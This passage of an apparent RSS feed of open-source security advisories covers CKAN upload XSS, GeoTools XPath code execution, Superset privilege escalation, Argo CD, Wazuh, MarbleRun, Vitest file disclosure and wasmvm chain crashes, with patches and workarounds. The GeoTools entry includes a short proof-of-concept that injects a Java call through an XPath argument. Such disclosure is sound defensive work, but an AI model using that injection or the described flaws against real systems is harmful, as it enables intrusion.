                            <b>Published:</b> 2025-02-05T17:41:33Z<br>
                            <b>Severity:</b> 7.3<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/ckan/ckan/security/advisories/GHSA-7pq5-qcp6-mcww'>https://github.com/ckan/ckan/security/advisories/GHSA-7pq5-qcp6-mcww</a></li><li>- <a target='_blank' href='https://github.com/ckan/ckan/commit/7da6a26c6183e0a97a356d1b1d2407f3ecc7b9c8'>https://github.com/ckan/ckan/commit/7da6a26c6183e0a97a356d1b1d2407f3ecc7b9c8</a></li><li>- <a target='_blank' href='https://github.com/ckan/ckan/commit/a4fc5e06634ed51d653ab819a7efc8e62f816f68'>https://github.com/ckan/ckan/commit/a4fc5e06634ed51d653ab819a7efc8e62f816f68</a></li><li>- <a target='_blank' href='https://docs.ckan.org/en/latest/maintaining/configuration.html#ckan-upload-group-mimetypes'>https://docs.ckan.org/en/latest/maintaining/configuration.html#ckan-upload-group-mimetypes</a></li><li>- <a target='_blank' href='https://docs.ckan.org/en/latest/maintaining/configuration.html#ckan-upload-group-types'>https://docs.ckan.org/en/latest/maintaining/configuration.html#ckan-upload-group-types</a></li><li>- <a target='_blank' href='https://docs.ckan.org/en/latest/maintaining/configuration.html#ckan-upload-user-mimetypes'>https://docs.ckan.org/en/latest/maintaining/configuration.html#ckan-upload-user-mimetypes</a></li><li>- <a target='_blank' href='https://docs.ckan.org/en/latest/maintaining/configuration.html#ckan-upload-user-types'>https://docs.ckan.org/en/latest/maintaining/configuration.html#ckan-upload-user-types</a></li><li>- <a target='_blank' href='https://github.com/ckan/ckan'>https://github.com/ckan/ckan</a></li></ul><br>
                            <b>Details:</b> <b>CKAN has an XSS vector in user uploaded images in group&#x2F;org and user profiles</b><br>### Impact
Using a specially crafted file, a user could potentially upload a file containing code that when executed could send arbitrary requests to the server. If that file was opened by an administrator, it could lead to escalation of privileges of the original submitter or other malicious actions. Users must have been registered to the site to exploit this vulnerability.

### Patches
This vulnerability has been fixed in CKAN 2.10.7 and 2.11.2

### Workarounds
On versions prior to CKAN 2.10.7 and 2.11.2, site maintainers can restrict the file types supported for uploading using the [ckan.upload.user.mimetypes](https:&#x2F;&#x2F;docs.ckan.org&#x2F;en&#x2F;latest&#x2F;maintaining&#x2F;configuration.html#ckan-upload-user-mimetypes) &#x2F; [ckan.upload.user.types](https:&#x2F;&#x2F;docs.ckan.org&#x2F;en&#x2F;latest&#x2F;maintaining&#x2F;configuration.html#ckan-upload-user-types) and [ckan.upload.group.mimetypes](https:&#x2F;&#x2F;docs.ckan.org&#x2F;en&#x2F;latest&#x2F;maintaining&#x2F;configuration.html#ckan-upload-group-mimetypes) &#x2F; [ckan.upload.group.types](https:&#x2F;&#x2F;docs.ckan.org&#x2F;en&#x2F;latest&#x2F;maintaining&#x2F;configuration.html#ckan-upload-group-types) config options.
To entirely disable file uploads you can use:

```ini
ckan.upload.user.types = none
```
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-w3pj-wh35-fq8w: 9.8 | <b>GeoTools Remote Code Execution (RCE) vulnerability in evaluating XPath expressions</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-w3pj-wh35-fq8w</link>
                    <pubDate>2025-02-05T15:32:02Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-w3pj-wh35-fq8w'>https://osv.dev/vulnerability/GHSA-w3pj-wh35-fq8w</a><br>
                            <b>Published:</b> 2025-02-05T15:32:02Z<br>
                            <b>Severity:</b> 9.8<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w'>https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w</a></li><li>- <a target='_blank' href='https://github.com/geotools/geotools/pull/4797'>https://github.com/geotools/geotools/pull/4797</a></li><li>- <a target='_blank' href='https://github.com/geotools/geotools/commit/f0c9961dc4d40c5acfce2169fab92805738de5ea'>https://github.com/geotools/geotools/commit/f0c9961dc4d40c5acfce2169fab92805738de5ea</a></li><li>- <a target='_blank' href='https://sourceforge.net/projects/geotools/files/GeoTools%2031%20Releases/31.1'>https://sourceforge.net/projects/geotools/files/GeoTools%2031%20Releases/31.1</a></li><li>- <a target='_blank' href='https://sourceforge.net/projects/geotools/files/GeoTools%2030%20Releases/30.3/geotools-30.3-patches.zip/download'>https://sourceforge.net/projects/geotools/files/GeoTools%2030%20Releases/30.3/geotools-30.3-patches.zip/download</a></li><li>- <a target='_blank' href='https://sourceforge.net/projects/geotools/files/GeoTools%2030%20Releases/30.2/geotools-30.2-patches.zip/download'>https://sourceforge.net/projects/geotools/files/GeoTools%2030%20Releases/30.2/geotools-30.2-patches.zip/download</a></li><li>- <a target='_blank' href='https://sourceforge.net/projects/geotools/files/GeoTools%2029%20Releases/29.2/geotools-29.2-patches.zip/download'>https://sourceforge.net/projects/geotools/files/GeoTools%2029%20Releases/29.2/geotools-29.2-patches.zip/download</a></li><li>- <a target='_blank' href='https://sourceforge.net/projects/geotools/files/GeoTools%2028%20Releases/28.2/geotools-28.2-patches.zip/download'>https://sourceforge.net/projects/geotools/files/GeoTools%2028%20Releases/28.2/geotools-28.2-patches.zip/download</a></li><li>- <a target='_blank' href='https://sourceforge.net/projects/geotools/files/GeoTools%2027%20Releases/27.5/geotools-27.5-patches.zip/download'>https://sourceforge.net/projects/geotools/files/GeoTools%2027%20Releases/27.5/geotools-27.5-patches.zip/download</a></li><li>- <a target='_blank' href='https://sourceforge.net/projects/geotools/files/GeoTools%2027%20Releases/27.4/geotools-27.4-patches.zip/download'>https://sourceforge.net/projects/geotools/files/GeoTools%2027%20Releases/27.4/geotools-27.4-patches.zip/download</a></li><li>- <a target='_blank' href='https://sourceforge.net/projects/geotools/files/GeoTools%2026%20Releases/26.7/geotools-26.7-patches.zip/download'>https://sourceforge.net/projects/geotools/files/GeoTools%2026%20Releases/26.7/geotools-26.7-patches.zip/download</a></li><li>- <a target='_blank' href='https://sourceforge.net/projects/geotools/files/GeoTools%2026%20Releases/26.4'>https://sourceforge.net/projects/geotools/files/GeoTools%2026%20Releases/26.4</a></li><li>- <a target='_blank' href='https://sourceforge.net/projects/geotools/files/GeoTools%2025%20Releases/25.2/geotools-25.2-patches.zip/download'>https://sourceforge.net/projects/geotools/files/GeoTools%2025%20Releases/25.2/geotools-25.2-patches.zip/download</a></li><li>- <a target='_blank' href='https://sourceforge.net/projects/geotools/files/GeoTools%2024%20Releases/24.0/geotools-24.0-patches.zip/download'>https://sourceforge.net/projects/geotools/files/GeoTools%2024%20Releases/24.0/geotools-24.0-patches.zip/download</a></li><li>- <a target='_blank' href='https://osgeo-org.atlassian.net/browse/GEOT-7587'>https://osgeo-org.atlassian.net/browse/GEOT-7587</a></li><li>- <a target='_blank' href='https://github.com/geotools/geotools'>https://github.com/geotools/geotools</a></li><li>- <a target='_blank' href='https://github.com/Warxim/CVE-2022-41852?tab=readme-ov-file#workaround-for-cve-2022-41852'>https://github.com/Warxim/CVE-2022-41852?tab=readme-ov-file#workaround-for-cve-2022-41852</a></li></ul><br>
                            <b>Details:</b> <b>GeoTools Remote Code Execution (RCE) vulnerability in evaluating XPath expressions</b><br>### Summary
Remote Code Execution (RCE) is possible if an application uses certain GeoTools functionality to evaluate XPath expressions supplied by user input.

### Details
The following methods pass XPath expressions to the `commons-jxpath` library which can execute arbitrary code and would be a security issue if the XPath expressions are provided by user input.

* `org.geotools.appschema.util.XmlXpathUtilites.getXPathValues(NamespaceSupport, String, Document)`
* `org.geotools.appschema.util.XmlXpathUtilites.countXPathNodes(NamespaceSupport, String, Document)`
* `org.geotools.appschema.util.XmlXpathUtilites.getSingleXPathValue(NamespaceSupport, String, Document)`
* `org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.get(Object, String, Class&amp;lt;T&amp;gt;)`
* `org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.set(Object, String, Object, Class)`
* `org.geotools.data.complex.expression.MapPropertyAccessorFactory.new PropertyAccessor() {...}.get(Object, String, Class&amp;lt;T&amp;gt;)`
* `org.geotools.xsd.StreamingParser.StreamingParser(Configuration, InputStream, String)`

### PoC
The following inputs to StreamingParser will delay the response by five seconds:
```
        new org.geotools.xsd.StreamingParser(
                        new org.geotools.filter.v1_0.OGCConfiguration(),
                        new java.io.ByteArrayInputStream(&quot;&amp;lt;Filter&amp;gt;&amp;lt;&#x2F;Filter&amp;gt;&quot;.getBytes()),
                        &quot;java.lang.Thread.sleep(5000)&quot;)
                .parse();
```

### Impact

This vulnerability can lead to executing arbitrary code.

### Mitigation

GeoTools can operate with reduced functionality by removing the `gt-complex` jar from your application.  As an example of the impact application schema datastore would not function without the ability to use XPath expressions to query complex content.

The SourceForge download page lists drop-in-replacement jars for GeoTools: [31.1](https:&#x2F;&#x2F;sourceforge.net&#x2F;projects&#x2F;geotools&#x2F;files&#x2F;GeoTools%2031%20Releases&#x2F;31.1&#x2F;), [30.3](https:&#x2F;&#x2F;sourceforge.net&#x2F;projects&#x2F;geotools&#x2F;files&#x2F;GeoTools%2030%20Releases&#x2F;30.3&#x2F;geotools-30.3-patches.zip&#x2F;download), [30.2](https:&#x2F;&#x2F;sourceforge.net&#x2F;projects&#x2F;geotools&#x2F;files&#x2F;GeoTools%2030%20Releases&#x2F;30.2&#x2F;geotools-30.2-patches.zip&#x2F;download), [29.2](https:&#x2F;&#x2F;sourceforge.net&#x2F;projects&#x2F;geotools&#x2F;files&#x2F;GeoTools%2029%20Releases&#x2F;29.2&#x2F;geotools-29.2-patches.zip&#x2F;download), [28.2](https:&#x2F;&#x2F;sourceforge.net&#x2F;projects&#x2F;geotools&#x2F;files&#x2F;GeoTools%2028%20Releases&#x2F;28.2&#x2F;geotools-28.2-patches.zip&#x2F;download), [27.5](https:&#x2F;&#x2F;sourceforge.net&#x2F;projects&#x2F;geotools&#x2F;files&#x2F;GeoTools%2027%20Releases&#x2F;27.5&#x2F;geotools-27.5-patches.zip&#x2F;download), [27.4](https:&#x2F;&#x2F;sourceforge.net&#x2F;projects&#x2F;geotools&#x2F;files&#x2F;GeoTools%2027%20Releases&#x2F;27.4&#x2F;geotools-27.4-patches.zip&#x2F;download), [26.7](https:&#x2F;&#x2F;sourceforge.net&#x2F;projects&#x2F;geotools&#x2F;files&#x2F;GeoTools%2026%20Releases&#x2F;26.7&#x2F;geotools-26.7-patches.zip&#x2F;download), [26.4](https:&#x2F;&#x2F;sourceforge.net&#x2F;projects&#x2F;geotools&#x2F;files&#x2F;GeoTools%2026%20Releases&#x2F;26.4&#x2F;), [25.2](https:&#x2F;&#x2F;sourceforge.net&#x2F;projects&#x2F;geotools&#x2F;files&#x2F;GeoTools%2025%20Releases&#x2F;25.2&#x2F;geotools-25.2-patches.zip&#x2F;download), [24.0](https:&#x2F;&#x2F;sourceforge.net&#x2F;projects&#x2F;geotools&#x2F;files&#x2F;GeoTools%2024%20Releases&#x2F;24.0&#x2F;geotools-24.0-patches.zip&#x2F;download). These jars are for download only and are not available from maven central, intended to quickly provide a fix to affected applications.

### References
https:&#x2F;&#x2F;github.com&#x2F;geoserver&#x2F;geoserver&#x2F;security&#x2F;advisories&#x2F;GHSA-6jj6-gm7p-fcvv
https:&#x2F;&#x2F;osgeo-org.atlassian.net&#x2F;browse&#x2F;GEOT-7587
https:&#x2F;&#x2F;github.com&#x2F;geotools&#x2F;geotools&#x2F;pull&#x2F;4797
https:&#x2F;&#x2F;github.com&#x2F;Warxim&#x2F;CVE-2022-41852?tab=readme-ov-file#workaround-for-cve-2022-41852
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-superset-2023-40610: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-superset-2023-40610</link>
                    <pubDate>2025-02-05T07:27:36.004Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-superset-2023-40610'>https://osv.dev/vulnerability/BIT-superset-2023-40610</a><br>
                            <b>Published:</b> 2025-02-05T07:27:36.004Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2023/11/27/2'>http://www.openwall.com/lists/oss-security/2023/11/27/2</a></li><li>- <a target='_blank' href='https://github.com/orangecertcc/security-research/security/advisories/GHSA-f678-j579-4xf5'>https://github.com/orangecertcc/security-research/security/advisories/GHSA-f678-j579-4xf5</a></li><li>- <a target='_blank' href='https://lists.apache.org/thread/jvgxpk4dbxyqtsgtl4pdgbd520rc0rot'>https://lists.apache.org/thread/jvgxpk4dbxyqtsgtl4pdgbd520rc0rot</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Improper authorization check and possible privilege escalation on Apache Superset up to but excluding 2.1.2. Using the default examples database connection that allows access to both the examples schema and Apache Superset&#x27;s metadata database, an attacker using a specially crafted CTE SQL statement could change data on the metadata database. This weakness could result on tampering with the authentication&#x2F;authorization data.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GO-2025-3433: 0 | Argo CD does not scrub secret values from patch errors in github.com&#x2F;argoproj&#x2F;argo-cd</title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GO-2025-3433</link>
                    <pubDate>2025-02-04T22:06:11Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GO-2025-3433'>https://osv.dev/vulnerability/GO-2025-3433</a><br>
                            <b>Published:</b> 2025-02-04T22:06:11Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/argoproj/gitops-engine/commit/7e21b91e9d0f64104c8a661f3f390c5e6d73ddca'>https://github.com/argoproj/gitops-engine/commit/7e21b91e9d0f64104c8a661f3f390c5e6d73ddca</a></li><li>- <a target='_blank' href='https://github.com/argoproj/gitops-engine/security/advisories/GHSA-274v-mgcv-cm8j'>https://github.com/argoproj/gitops-engine/security/advisories/GHSA-274v-mgcv-cm8j</a></li></ul><br>
                            <b>Details:</b> Argo CD does not scrub secret values from patch errors in github.com&#x2F;argoproj&#x2F;argo-cd
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GO-2025-3437: 0 | Argo CD GitOps Engine does not scrub secret values from patch errors in github.com&#x2F;argoproj&#x2F;gitops-engine</title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GO-2025-3437</link>
                    <pubDate>2025-02-04T22:06:11Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GO-2025-3437'>https://osv.dev/vulnerability/GO-2025-3437</a><br>
                            <b>Published:</b> 2025-02-04T22:06:11Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/argoproj/argo-cd/commit/6f5537bdf15ddbaa0f27a1a678632ff0743e4107'>https://github.com/argoproj/argo-cd/commit/6f5537bdf15ddbaa0f27a1a678632ff0743e4107</a></li><li>- <a target='_blank' href='https://github.com/argoproj/argo-cd/security/advisories/GHSA-47g2-qmh2-749v'>https://github.com/argoproj/argo-cd/security/advisories/GHSA-47g2-qmh2-749v</a></li></ul><br>
                            <b>Details:</b> Argo CD GitOps Engine does not scrub secret values from patch errors in github.com&#x2F;argoproj&#x2F;gitops-engine
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GO-2025-3444: 0 | Improper Access Control in wazuh-agent in github.com&#x2F;wazuh&#x2F;wazuh</title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GO-2025-3444</link>
                    <pubDate>2025-02-04T22:06:11Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GO-2025-3444'>https://osv.dev/vulnerability/GO-2025-3444</a><br>
                            <b>Published:</b> 2025-02-04T22:06:11Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/wazuh/wazuh/security/advisories/GHSA-pmr2-2r83-h3cv'>https://github.com/wazuh/wazuh/security/advisories/GHSA-pmr2-2r83-h3cv</a></li></ul><br>
                            <b>Details:</b> Improper Access Control in wazuh-agent in github.com&#x2F;wazuh&#x2F;wazuh
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GO-2025-3445: 0 | Ability to view Agent list with no privilege access in wazuh-dashboard in github.com&#x2F;wazuh&#x2F;wazuh</title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GO-2025-3445</link>
                    <pubDate>2025-02-04T22:06:11Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GO-2025-3445'>https://osv.dev/vulnerability/GO-2025-3445</a><br>
                            <b>Published:</b> 2025-02-04T22:06:11Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/wazuh/wazuh/security/advisories/GHSA-648q-8m78-5cwv'>https://github.com/wazuh/wazuh/security/advisories/GHSA-648q-8m78-5cwv</a></li></ul><br>
                            <b>Details:</b> Ability to view Agent list with no privilege access in wazuh-dashboard in github.com&#x2F;wazuh&#x2F;wazuh
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-w7wm-2425-7p2h: 7.1 | <b>MarbleRun unauthenticated recovery allows Coordinator impersonation</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-w7wm-2425-7p2h</link>
                    <pubDate>2025-02-04T21:23:48Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-w7wm-2425-7p2h'>https://osv.dev/vulnerability/GHSA-w7wm-2425-7p2h</a><br>
                            <b>Published:</b> 2025-02-04T21:23:48Z<br>
                            <b>Severity:</b> 7.1<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/edgelesssys/marblerun/security/advisories/GHSA-w7wm-2425-7p2h'>https://github.com/edgelesssys/marblerun/security/advisories/GHSA-w7wm-2425-7p2h</a></li><li>- <a target='_blank' href='https://github.com/edgelesssys/marblerun/commit/e4864f9f1d0f12a4a7d28514da43bcc75603a5b5'>https://github.com/edgelesssys/marblerun/commit/e4864f9f1d0f12a4a7d28514da43bcc75603a5b5</a></li><li>- <a target='_blank' href='https://github.com/edgelesssys/marblerun'>https://github.com/edgelesssys/marblerun</a></li><li>- <a target='_blank' href='https://github.com/edgelesssys/marblerun/releases/tag/v1.7.0'>https://github.com/edgelesssys/marblerun/releases/tag/v1.7.0</a></li><li>- <a target='_blank' href='https://pkg.go.dev/vuln/GO-2025-3450'>https://pkg.go.dev/vuln/GO-2025-3450</a></li></ul><br>
                            <b>Details:</b> <b>MarbleRun unauthenticated recovery allows Coordinator impersonation</b><br>### Impact

During recovery, a Coordinator only verifies that a given recovery key decrypts the sealed state, not if this key was provided by a party with access to one of the recovery keys defined in the manifest.
This allows an attacker to manually craft a sealed state using their own recovery keys, and a manifest that does not match the rest of the state.

If network traffic is redirected from the legitimate coordinator to the attacker&#x27;s Coordinator, a remote party is susceptible to impersonation if they verify the Coordinator without comparing the root certificate of the Coordinator against a trusted reference.

Under these circumstances, an attacker can trick a remote party into trusting the malicious Coordinator by presenting a manifest that does not match the actual state of the deployment.

This issue does **not** affect the following:

* secrets and state of the legitimate Coordinator instances
* integrity of workloads
* certificates chaining back to the legitimate Coordinator root certificate

### Patches

The issue has been patched in [`v1.7.0`](https:&#x2F;&#x2F;github.com&#x2F;edgelesssys&#x2F;marblerun&#x2F;releases&#x2F;tag&#x2F;v1.7.0).

### Workarounds

Connections that purely authenticate based on a known Coordinator&#x27;s root certificate, e.g. the one retrieved when using the `marblerun manifest set` CLI command, are not affected.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2025-24963: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2025-24963</link>
                    <pubDate>2025-02-04T20:15:50Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2025-24963'>https://osv.dev/vulnerability/CVE-2025-24963</a><br>
                            <b>Published:</b> 2025-02-04T20:15:50Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> ts<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/vitest-dev/vitest/blob/f17918a79969d27a415f70431e08a9445b051e45/packages/browser/src/node/plugin.ts#L88-L130'>https://github.com/vitest-dev/vitest/blob/f17918a79969d27a415f70431e08a9445b051e45/packages/browser/src/node/plugin.ts#L88-L130</a></li><li>- <a target='_blank' href='https://vitest.dev/guide/browser/config.html#browser-api'>https://vitest.dev/guide/browser/config.html#browser-api</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Vitest is a testing framework powered by Vite. The `__screenshot-error` handler on the browser mode HTTP server that responds any file on the file system. Especially if the server is exposed on the network by `browser.api.host: true`, an attacker can send a request to that handler from remote to get the content of arbitrary files.This `__screenshot-error` handler on the browser mode HTTP server responds any file on the file system. This code was added by commit `2d62051`. Users explicitly exposing the browser mode server to the network by `browser.api.host: true` may get any files exposed. This issue has been addressed in versions 2.1.9 and 3.0.4. Users are advised to upgrade. There are no known workarounds for this vulnerability.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-mx2j-7cmv-353c: 0 | <b>wasmvm: Malicious smart contract can slow down block production</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-mx2j-7cmv-353c</link>
                    <pubDate>2025-02-04T18:57:21Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-mx2j-7cmv-353c'>https://osv.dev/vulnerability/GHSA-mx2j-7cmv-353c</a><br>
                            <b>Published:</b> 2025-02-04T18:57:21Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/CosmWasm/wasmvm/security/advisories/GHSA-mx2j-7cmv-353c'>https://github.com/CosmWasm/wasmvm/security/advisories/GHSA-mx2j-7cmv-353c</a></li><li>- <a target='_blank' href='https://github.com/CosmWasm/cosmwasm/commit/2b7f2faa57a1efc8207455c37f87f1eee6035a27'>https://github.com/CosmWasm/cosmwasm/commit/2b7f2faa57a1efc8207455c37f87f1eee6035a27</a></li><li>- <a target='_blank' href='https://github.com/CosmWasm/cosmwasm/commit/a5d62f65b5eb947ebe40e2085b1c48a9d0a244d0'>https://github.com/CosmWasm/cosmwasm/commit/a5d62f65b5eb947ebe40e2085b1c48a9d0a244d0</a></li><li>- <a target='_blank' href='https://github.com/CosmWasm/cosmwasm/commit/d6143b0aff16a39bbea4be37597d8e9d9b213d3b'>https://github.com/CosmWasm/cosmwasm/commit/d6143b0aff16a39bbea4be37597d8e9d9b213d3b</a></li><li>- <a target='_blank' href='https://github.com/CosmWasm/cosmwasm/commit/f0c04c03cbe2557634c1bbcdc2ce203fe7caca58'>https://github.com/CosmWasm/cosmwasm/commit/f0c04c03cbe2557634c1bbcdc2ce203fe7caca58</a></li><li>- <a target='_blank' href='https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2025-002.md'>https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2025-002.md</a></li><li>- <a target='_blank' href='https://github.com/CosmWasm/wasmvm'>https://github.com/CosmWasm/wasmvm</a></li><li>- <a target='_blank' href='https://pkg.go.dev/vuln/GO-2025-3449'>https://pkg.go.dev/vuln/GO-2025-3449</a></li></ul><br>
                            <b>Details:</b> <b>wasmvm: Malicious smart contract can slow down block production</b><br># CWA-2025-002

**Severity**

Medium (Moderate + Likely)[^1]

**Affected versions:**

- wasmvm &amp;gt;= 2.2.0, &amp;lt; 2.2.2
- wasmvm &amp;gt;= 2.1.0, &amp;lt; 2.1.5
- wasmvm &amp;gt;= 2.0.0, &amp;lt; 2.0.6
- wasmvm &amp;lt; 1.5.8

**Patched versions:**

- wasmvm 1.5.8, 2.0.6, 2.1.5, 2.2.2

## Description of the bug

The vulnerability can be used to slow down block production. The attack requires a malicious contract,
so permissioned chains are unlikely to be affected.

(We&#x27;ll add more detail once chains had a chance to upgrade.)

## Patch

- 1.5: https:&#x2F;&#x2F;github.com&#x2F;CosmWasm&#x2F;cosmwasm&#x2F;commit&#x2F;2b7f2faa57a1efc8207455c37f87f1eee6035a27
- 2.0: https:&#x2F;&#x2F;github.com&#x2F;CosmWasm&#x2F;cosmwasm&#x2F;commit&#x2F;d6143b0aff16a39bbea4be37597d8e9d9b213d3b
- 2.1: https:&#x2F;&#x2F;github.com&#x2F;CosmWasm&#x2F;cosmwasm&#x2F;commit&#x2F;f0c04c03cbe2557634c1bbcdc2ce203fe7caca58
- 2.2: https:&#x2F;&#x2F;github.com&#x2F;CosmWasm&#x2F;cosmwasm&#x2F;commit&#x2F;a5d62f65b5eb947ebe40e2085b1c48a9d0a244d0

## Applying the patch

The patch will be shipped in releases of wasmvm. You can update more or less as follows:

1. Check the current wasmvm version: `go list -m github.com&#x2F;CosmWasm&#x2F;wasmvm`
2. Bump the `github.com&#x2F;CosmWasm&#x2F;wasmvm` dependency in your go.mod to one of the patched version
   depending on which minor version you are on; `go mod tidy`; commit.
3. If you use the static libraries `libwasmvm_muslc.aarch64.a`&#x2F;`libwasmvm_muslc.x86_64.a`, update them accordingly.
4. Check the updated wasmvm version: `go list -m github.com&#x2F;CosmWasm&#x2F;wasmvm` and ensure you see 1.5.8, 2.0.6, 2.1.5 or 2.2.2.
5. Follow your regular practices to deploy chain upgrades.

The patch is consensus breaking and requires a coordinated upgrade.

## Acknowledgement

This issue was found by meadow101 who reported it to the Cosmos Bug Bounty Program on HackerOne.

If you believe you have found a bug in the Interchain Stack or would like to contribute to the
program by reporting a bug, please see &amp;lt;https:&#x2F;&#x2F;hackerone.com&#x2F;cosmos&amp;gt;.

## Timeline

- 2024-11-24: Confio receives a report through the Cosmos bug bounty program maintained by Amulet.
- 2024-12-20: Confio security contributors confirm the report.
- 2024-01-27: Confio developed the patch internally.
- 2025-02-04: Patch gets released.

[^1]: following Amulet&#x27;s Severity Classification Framework ACMv1.2: https:&#x2F;&#x2F;github.com&#x2F;interchainio&#x2F;security&#x2F;blob&#x2F;0295254e8645301ccb606d46108a45cede0a73e0&#x2F;resources&#x2F;CLASSIFICATION_MATRIX.md
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-23qp-3c2m-xx6w: 0 | <b>wasmvm: Malicious smart contract can crash the chain</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-23qp-3c2m-xx6w</link>
                    <pubDate>2025-02-04T18:54:13Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-23qp-3c2m-xx6w'>https://osv.dev/vulnerability/GHSA-23qp-3c2m-xx6w</a><br>
                            <b>Published:</b> 2025-02-04T18:54:13Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/CosmWasm/wasmvm/security/advisories/GHSA-23qp-3c2m-xx6w'>https://github.com/CosmWasm/wasmvm/security/advisories/GHSA-23qp-3c2m-xx6w</a></li><li>- <a target='_blank' href='https://github.com/CosmWasm/wasmvm/commit/0aefa4c378457aeb3c07e7975b875be38872c56d'>https://github.com/CosmWasm/wasmvm/commit/0aefa4c378457aeb3c07e7975b875be38872c56d</a></li><li>- <a target='_blank' href='https://github.com/CosmWasm/wasmvm/commit/1151bc6df7d02d1889b8da37cf8510eaf4198eea'>https://github.com/CosmWasm/wasmvm/commit/1151bc6df7d02d1889b8da37cf8510eaf4198eea</a></li><li>- <a target='_blank' href='https://github.com/CosmWasm/wasmvm/commit/8d44a286fabc793a2fba93752e58cd0fd5b88a2d'>https://github.com/CosmWasm/wasmvm/commit/8d44a286fabc793a2fba93752e58cd0fd5b88a2d</a></li><li>- <a target='_blank' href='https://github.com/CosmWasm/wasmvm/commit/d4ff2adee44e6b9f7415a5dfbb3de745ab9b7678'>https://github.com/CosmWasm/wasmvm/commit/d4ff2adee44e6b9f7415a5dfbb3de745ab9b7678</a></li><li>- <a target='_blank' href='https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2025-001.md'>https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2025-001.md</a></li><li>- <a target='_blank' href='https://github.com/CosmWasm/wasmvm'>https://github.com/CosmWasm/wasmvm</a></li><li>- <a target='_blank' href='https://pkg.go.dev/vuln/GO-2025-3448'>https://pkg.go.dev/vuln/GO-2025-3448</a></li></ul><br>
                            <b>Details:</b> <b>wasmvm: Malicious smart contract can crash the chain</b><br># CWA-2025-001

**Severity**

Medium (Moderate + Likely)[^1]

**Affected versions:**

- wasmvm &amp;gt;= 2.2.0, &amp;lt; 2.2.2
- wasmvm &amp;gt;= 2.1.0, &amp;lt; 2.1.5
- wasmvm &amp;gt;= 2.0.0, &amp;lt; 2.0.6
- wasmvm &amp;lt; 1.5.8

**Patched versions:**

- wasmvm 1.5.8, 2.0.6, 2.1.5, 2.2.2

## Description of the bug

The vulnerability can be used to crash the chain. The underlying bug that causes this is present on both permissioned and premissionless chains, but it can only be triggered _reliably_ with a malicious contract, so permissioned chains are much less likely to be affected.

(We&#x27;ll add more detail once chains had a chance to upgrade.)

## Patch

- 1.5: https:&#x2F;&#x2F;github.com&#x2F;CosmWasm&#x2F;wasmvm&#x2F;commit&#x2F;1151bc6df7d02d1889b8da37cf8510eaf4198eea
